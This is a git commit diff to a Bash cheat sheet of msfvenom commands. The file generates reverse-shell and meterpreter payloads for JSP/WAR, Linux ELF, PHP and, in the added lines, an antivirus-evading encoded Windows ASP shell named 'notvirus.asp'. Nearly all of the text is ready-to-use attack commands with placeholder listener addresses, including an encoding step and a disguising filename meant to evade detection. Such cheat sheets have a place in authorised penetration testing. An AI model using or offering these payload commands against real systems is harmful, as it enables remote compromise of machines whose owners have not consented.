ec7614235a3d1b2266436e9e4fa3b63b4ab07995
Corvo <50427765+rf-peixoto@users.noreply.github.com>
2021-10-09 19:18:01 -0300

    Update msfvenom_payload.sh

--- Code/Bash/msfvenom_payload.sh
+++ Code/Bash/msfvenom_payload.sh
@@ -7,3 +7,5 @@ msfvenom -p java/jsp_shell_reverse_tcp lhost=[IP] lport=[PORT] -f .war -o [outpu
 msfvenom -p linux/x86/shell/reverse_tcp lhost=[IP] lport=[PORT] -f .elf -o [output.elf] # [WIP]
 # PHP
 msfvenom -p php/meterpreter/reverse_tcp lhost=[IP] lport=[PORT] -f raw > [output.php]
+# Encoded:
+msfvenom -p windows/shell/reverse_tcp -e x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f asp > notvirus.asp
